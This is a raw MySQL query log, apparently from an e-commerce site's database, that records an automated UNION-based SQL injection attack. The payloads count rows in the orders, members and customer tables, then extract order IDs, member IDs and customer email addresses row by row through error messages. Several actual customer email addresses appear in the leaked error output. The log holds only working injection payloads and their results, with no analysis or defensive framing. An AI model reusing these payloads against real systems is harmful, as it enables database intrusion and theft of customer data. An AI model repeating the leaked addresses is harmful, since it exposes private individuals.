+[2021-02-12 20:32:32]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(*),0x27,0x7e) from `klxmart_ecommerce`._tbl_orders),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:32]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:32]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(*),0x27,0x7e) from `klxmart_ecommerce`._tbl_orders),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:32]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:32]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:32]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:32]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(*),0x27,0x7e) from `klxmart_ecommerce`._tbl_orders),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:32]	select CategoryID from _tbl_products where SubCategoryID='~'3'~'  and IsActive='1'
+[2021-02-12 20:32:32]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '3'~'  and IsActive='1'' at line 1
+[2021-02-12 20:32:32]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:32]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_orders.OrderID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_orders Order by OrderID limit 0,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:32]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:32]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_orders.OrderID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_orders Order by OrderID limit 0,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:32]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:32]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:32]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:32]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_orders.OrderID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_orders Order by OrderID limit 0,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:32]	select CategoryID from _tbl_products where SubCategoryID=''~1'~'  and IsActive='1'
+[2021-02-12 20:32:32]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '~1'~'  and IsActive='1'' at line 1
+[2021-02-12 20:32:33]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:33]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_orders.OrderID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_orders Order by OrderID limit 1,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:33]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:33]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_orders.OrderID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_orders Order by OrderID limit 1,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:33]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:33]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:33]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:33]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_orders.OrderID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_orders Order by OrderID limit 1,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:33]	select CategoryID from _tbl_products where SubCategoryID=''~2'~'  and IsActive='1'
+[2021-02-12 20:32:33]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '~2'~'  and IsActive='1'' at line 1
+[2021-02-12 20:32:40]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:40]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(*),0x27,0x7e) from `klxmart_ecommerce`._tbl_members),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:40]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:40]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(*),0x27,0x7e) from `klxmart_ecommerce`._tbl_members),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:40]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:40]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:40]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:40]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(*),0x27,0x7e) from `klxmart_ecommerce`._tbl_members),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:40]	select CategoryID from _tbl_products where SubCategoryID='~'1'~'  and IsActive='1'
+[2021-02-12 20:32:40]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'~'  and IsActive='1'' at line 1
+[2021-02-12 20:32:41]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:41]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_members.MemberID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_members Order by MemberID limit 0,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:41]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:41]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_members.MemberID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_members Order by MemberID limit 0,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:41]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:41]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:41]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:41]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_members.MemberID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_members Order by MemberID limit 0,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:41]	select CategoryID from _tbl_products where SubCategoryID=''~1'~'  and IsActive='1'
+[2021-02-12 20:32:41]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '~1'~'  and IsActive='1'' at line 1
+[2021-02-12 20:32:46]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:46]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(*),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:46]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:46]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(*),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:46]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:46]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:46]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:46]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x7e,0x27,count(*),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:46]	select CategoryID from _tbl_products where SubCategoryID='~'9'~'  and IsActive='1'
+[2021-02-12 20:32:46]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '9'~'  and IsActive='1'' at line 1
+[2021-02-12 20:32:47]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:47]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 0,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:47]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:47]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 0,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:47]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:47]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:47]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:47]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 0,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:47]	select CategoryID from _tbl_products where SubCategoryID=''  and IsActive='1'
+[2021-02-12 20:32:48]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:48]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,_tbl_customer.EmailID,0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 0,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:48]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:48]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,_tbl_customer.EmailID,0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 0,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:48]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:48]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:48]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:48]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x27,0x7e,_tbl_customer.EmailID,0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 0,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:48]	select CategoryID from _tbl_products where SubCategoryID=''  and IsActive='1'
+[2021-02-12 20:32:48]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:48]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,_tbl_customer.EmailID,0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 1,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:48]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:48]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,_tbl_customer.EmailID,0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 1,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:48]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:48]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:48]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:48]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x27,0x7e,_tbl_customer.EmailID,0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 1,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:48]	select CategoryID from _tbl_products where SubCategoryID=''  and IsActive='1'
+[2021-02-12 20:32:49]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:49]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 1,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:49]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:49]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 1,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:49]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:49]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:49]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:49]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 1,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:49]	select CategoryID from _tbl_products where SubCategoryID=''  and IsActive='1'
+[2021-02-12 20:32:50]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:50]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 2,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:50]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:50]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 2,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:50]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:50]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:50]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:50]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 2,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:50]	select CategoryID from _tbl_products where SubCategoryID=''~bartashnaason@yandex.ru'~'  and IsActive='1'
+[2021-02-12 20:32:50]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '~bartashnaason@yandex.ru'~'  and IsActive='1'' at line 1
+[2021-02-12 20:32:50]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:50]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 3,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:50]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:50]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 3,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:50]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:50]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:50]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:50]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 3,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:50]	select CategoryID from _tbl_products where SubCategoryID=''~demo@gmail.com'~'  and IsActive='1'
+[2021-02-12 20:32:50]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '~demo@gmail.com'~'  and IsActive='1'' at line 1
+[2021-02-12 20:32:51]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:51]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 4,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:51]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:51]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 4,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:51]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:51]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:51]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:51]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 4,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:51]	select CategoryID from _tbl_products where SubCategoryID=''~i.oox.ve.r.t.r.i.s.@gmail.com'~'  and IsActive='1'
+[2021-02-12 20:32:51]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '~i.oox.ve.r.t.r.i.s.@gmail.com'~'  and IsActive='1'' at line 1
+[2021-02-12 20:32:51]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:51]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 5,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:51]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:51]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 5,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:51]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:51]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:51]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:51]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 5,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:51]	select CategoryID from _tbl_products where SubCategoryID=''~jesyajeshu@gmail.com'~'  and IsActive='1'
+[2021-02-12 20:32:51]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '~jesyajeshu@gmail.com'~'  and IsActive='1'' at line 1
+[2021-02-12 20:32:52]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:52]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 6,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:52]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:52]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 6,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:52]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:52]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:52]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:52]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 6,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:52]	select CategoryID from _tbl_products where SubCategoryID=''~jeya123@gmail.com'~'  and IsActive='1'
+[2021-02-12 20:32:52]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '~jeya123@gmail.com'~'  and IsActive='1'' at line 1
+[2021-02-12 20:32:53]	select * from _tbl_category where IsActive='1' order by ListOrder
